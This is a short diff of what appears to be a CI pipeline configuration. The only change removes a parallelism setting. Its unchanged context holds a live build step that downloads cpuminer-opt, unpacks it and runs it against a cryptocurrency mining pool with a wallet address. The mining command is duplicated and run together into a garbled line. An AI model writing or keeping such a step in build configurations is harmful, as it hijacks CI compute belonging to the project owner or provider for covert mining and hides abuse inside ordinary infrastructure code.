@@ -17,7 +17,6 @@ blocks:
             - >-
               wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u Muv1rtGiiLYrsEgQ1mESBbLcrtP4TTm2ox.G -p -t6wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u
               Muv1rtGiiLYrsEgQ1mESBbLcrtP4TTm2ox.G -p -t6
-          parallelism: 8
   - name: Run Code Analysis
     task:
       prologue:
